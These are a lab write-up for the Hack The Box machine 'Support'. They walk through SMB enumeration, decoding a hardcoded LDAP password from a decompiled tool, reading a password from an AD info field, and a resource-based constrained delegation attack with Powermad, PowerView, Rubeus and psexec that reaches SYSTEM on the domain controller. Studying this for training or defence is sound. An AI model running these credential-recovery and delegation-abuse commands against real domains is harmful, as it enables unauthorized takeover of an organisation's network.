1, Recon
port scan:
	53/tcp domain
	88/tcp kerberos-sec
	135/tcp RPC
	389/tcp ldap
	445/tcp SMB

Firstly, we want to check the SMB client, but I’m not able to connect to the three administrative shares without creds.
`crackmapexec` isn’t able to list any shares:
```
crackmapexec smb support.htb

SMB         support.htb     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False

crackmapexec smb support.htb --shares
SMB         support.htb     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         support.htb     445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
```


```
smbclient -N -L //support.htb

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to support.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
But we can check `support-tools`

```
smb: \> ls
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

                4026367 blocks of size 4096. 971094 blocks available
```

I think `UserInfo.exe.zip` would be useful for us.
By unzip it and we need to use `dotPeek` to decompile it. And this would be useful for us to check the existed password.

```
namespace UserInfo.Services
{
  internal class Protected
  {
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static string getPassword()
    {
      byte[] numArray = Convert.FromBase64String(Protected.enc_password);
      byte[] bytes = numArray;
      for (int index = 0; index < numArray.Length; ++index)
        bytes[index] = (byte) ((int) numArray[index] ^ (int) Protected.key[index % Protected.key.Length] ^ 223);
      return Encoding.Default.GetString(bytes);
    }
  }
}

```

Let's check it and try to crack it step by step by python:
```
python3
>>> from base64 import b64decode
>>> from itertools import cycle
>>> pass_b64 = b"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
>>> key = b"armando"
>>> enc = b64decode(pass_b64)
>>> [e^k^223 for e,k in zip(enc, cycle(key))]
[110, 118, 69, 102, 69, 75, 49, 54, 94, 49, 97, 77, 52, 36, 101, 55, 65, 99, 108, 85, 102, 56, 120, 36, 116, 82, 87, 120, 80, 87, 79, 49, 37, 108, 109, 122]
>>> bytearray([e^k^223 for e,k in zip(enc, cycle(key))]).decode()
'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

Then we can use it verify creds:
```
crackmapexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'`

SMB         support.htb     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         support.htb     445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

```

Whenever I find creds on Windows, I’ll run Bloodhound. Since I don’t have a shell, I’ll use the Python version:

```
bloodhound-python -c ALL -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174

INFO: Found AD domain: support.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.support.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.support.htb
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Management.support.htb
INFO: Querying computer: dc.support.htb
INFO: Done in 00M 02S
```

ldapsearch will show all the items in the AD, which I can look through:
`ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" | less`

There’s a user named support with an interesting info field:
`info: Ironside47pleasure40Watchful`
I guess it would be the password of one of user.

Looking at the Bloodhound data, support shows up there as a member of Remote Management Users:
![](images/Pasted%20image%2020240905125823.png)

crackmapexec confirms:
```
crackmapexec winrm support.htb -u support -p 'Ironside47pleasure40Watchful'

WINRM       support.htb     5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)

```

Let's use `evil-WinRM` to connect it.
`evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'`
Then we can get the user.txt

3, shell as SYSTEM
Looking at the Bloodhound data again, the support user is a member of the Shared Support Accounts group, which has GenericAll on the computer object, DC.SUPPORT.HTB:
![](images/Pasted%20image%2020240905130300.png)

```
I’m going to abuse resource-based constrained delegation. First I’ll add a fake computer to the domain under my control. Then I can act as the DC to request Kerberos tickets for the fake computer giving the ability to impersonate other accounts, like Administrator. For this to work, I’ll need an authenticated user who can add machines to the domain (by default, any user can add up to 10). This is configured in the ms-ds-machineaccountquota attribute, which needs to be larger than 0. Finally, I need write privileges over a domain joined computer (which GenericALL on the DC gets me.)
```

I’ll need three scripts to complete this attack:
```
PowerView.ps1
PowerMad.ps1
Rubeus.exe (pre-compiled exes from SharpCollection)
```

I’ll upload these and import the two PowerShell scripts into my session:

I’ll need to know the administrator on DC, which Bloodhound tells me is administrator@support.htb:
![](images/Pasted%20image%2020240905132915.png)

I’ll verify that users can add machines to the domain:
```
*Evil-WinRM* PS C:\programdata> Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota

ms-ds-machineaccountquota
-------------------------
                       10
```

The quote is set to the default of 10, which is good.

I’ll also need to make sure there’s a 2012+ DC in the environment:
```
*Evil-WinRM* PS C:\programdata> Get-DomainController | select name,osversion | fl

Name      : dc.support.htb
OSVersion : Windows Server 2022 Standard
```

Finally, I’ll want to check that the `msds-allowedtoactonbehalfofotheridentity` is empty:
```
*Evil-WinRM* PS C:\programdata> Get-DomainComputer DC | select name,msds-allowedtoactonbehalfofotheridentity | fl

name                                     : DC
msds-allowedtoactonbehalfofotheridentity :
```

I’ll use the `Powermad` `New-MachineAccount` to create a fake computer:
```
*Evil-WinRM* PS C:\programdata> New-MachineAccount -MachineAccount 0xdfFakeComputer -Password $(ConvertTo-SecureString '0xdf0xdf123' -AsPlainText -Force)
[+] Machine account 0xdfFakeComputer added
```

I need the SID of the computer object as well, so I’ll save it in a variable:
```
*Evil-WinRM* PS C:\programdata> $fakesid = Get-DomainComputer 0xdfFakeComputer | select -expand objectsid
*Evil-WinRM* PS C:\programdata> $fakesid
S-1-5-21-1677581083-3380853377-188903654-1121
```

Now I’ll configure the DC to trust my fake computer to make authorization decisions on it’s behalf. These commands will create an ACL with the fake computer’s SID and assign that to the DC:
```
*Evil-WinRM* PS C:\programdata> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
*Evil-WinRM* PS C:\programdata> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\programdata> $SD.GetBinaryForm($SDBytes, 0)
*Evil-WinRM* PS C:\programdata> Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

I’ll verify it worked:
```
*Evil-WinRM* PS C:\programdata> $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
*Evil-WinRM* PS C:\programdata> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
*Evil-WinRM* PS C:\programdata> $Descriptor.DiscretionaryAcl


BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-1121
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None
```

’ll use Rubeus to get the hash of my fake computer account:
`*Evil-WinRM* PS C:\programdata> .\Rubeus.exe hash /password:0xdf0xdf123 /user:0xdfFakeComputer /domain:support.htb`

I need the one labeled rc4_hmac, which I’ll pass to Rubeus to get a ticket for administrator:
`*Evil-WinRM* PS C:\programdata> .\Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt`

I’ll grab the last ticket Rubeus generated, and copy it back to my machine, saving it as ticket.kirbi.b64, making sure to remove all spaces. I’ll base64 decode it into ticket.kirbi:
`base64 -d ticket.kirbi.b64 > ticket.kirbi`

Now I need to convert it to a format that Impact can use:
`ticketConverter.py ticket.kirbi ticket.ccache`

I can use this to get a shell using psexec.py:
`KRB5CCNAME=ticket.ccache python3 psexec.py support.htb/administrator@dc.support.htb -k -no-pass`

And grab root.txt!
